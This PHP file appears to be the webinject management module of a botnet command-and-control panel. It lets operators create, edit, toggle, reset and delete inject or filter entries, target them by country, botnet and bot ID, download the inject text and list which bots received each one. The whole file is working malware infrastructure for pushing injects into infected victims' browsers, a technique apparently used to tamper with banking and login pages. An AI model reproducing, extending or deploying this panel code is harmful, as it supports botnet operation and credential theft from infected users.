<?php


if (!defined('__CP__')) {
	exit();
}

include_once __DIR__ . '/Webinj.php';
include_once __DIR__ . '/inj.html.php';
Log::$logStatus = 0;
Log::$saveBadData = false;
Sql::connect();
$msub = @$_REQUEST['msub'];

switch ($msub) {
case 'edit':
	$type = (@$_REQUEST['type'] == 'filter' ? 'filter' : 'inj');
	$webinj = new Webinj(@$_REQUEST['id']);

	if (!$webinj->type) {
		$webinj->type = $type;
	}

	$error = NULL;

	if (isset($_POST['name'])) {
		$webinj->name = @$_POST['name'];
		@$webinj->countries = implode(Webinj::fd, $_POST['countries']);
		@$webinj->botnets = implode(Webinj::fd, $_POST['botnets']);
		$webinj->bots = trim(@$_POST['bots']);
		$webinj->data = @$_POST['data'];
		$webinj->status = @$_POST['status'];
		$msg = NULL;

		if ($webinj->save($msg)) {
			if (@$_POST['with_reset'] == 1) {
				$webinj->reset();
			}

			header('Location: ?m=inj');
			exit();
		}
		else {
			$error = true;
		}
	}

	ThemeBegin('WebInjects', 0, getBotJsMenu('botmenu'), 0, InjHtml::extendForm($webinj), false);

	if ($error) {
		InjHtml::saveMsg(0, $msg);
	}

	InjHtml::editForm($webinj);
	break;

case 'action':
	$list = @$_POST['wlist'];
	$action = @$_POST['action'];

	if (is_array($list)) {
		foreach ($list as $id) {
			$webinj = new Webinj($id);

			if (!$webinj->id) {
				continue;
			}

			if ($action == 'enable') {
				$webinj->changeStatus(1);
			}
			else if ($action == 'disable') {
				$webinj->changeStatus(0);
			}
			else if ($action == 'reset') {
				$webinj->reset();
			}
			else if ($action == 'remove') {
				$webinj->remove();
			}
		}
	}

	header('Location: ?m=inj');
	exit();
	break;

case 'txt':
	$webinj = new Webinj(@$_REQUEST['id']);
	httpDownloadHeaders('webinj.txt', NULL);
	echo $webinj->data;
	exit();
	break;

case 'bots':
	$webinj = new Webinj(@$_REQUEST['id']);
	$dataset = $webinj->botList();
	ThemeBegin('WebInjects', 0, getBotJsMenu('botmenu'), 0, NULL, false);
	InjHtml::botList($dataset);
	break;

default:
	ThemeBegin('WebInjects', 0, getBotJsMenu('botmenu'), 0, NULL, false);
	InjHtml::listButtons();
	$data = Webinj::getAll(NULL, 'asc', NULL, NULL, NULL, NULL, NULL, true);

	if (!count($data)) {
		print('No webinjects data');
	}
	else {
		InjHtml::listAll($data);
	}

	break;
}

echo "\n" . '<script type="text/javascript" src="theme/bootstrap-multiselect.js"></script>' . "\n" . '<script type="text/javascript">' . "\n" . '    $(document).ready(function() {' . "\n" . '        $(\'#ms_country\').multiselect({includeSelectAllOption: true, buttonWidth: \'209px\', maxHeight: 200});' . "\n" . '        $(\'#ms_botnet\').multiselect({includeSelectAllOption: true, buttonWidth: \'209px\', maxHeight: 200});' . "\n" . '    });' . "\n" . '</script>' . "\n\n";
ThemeEnd();

?>
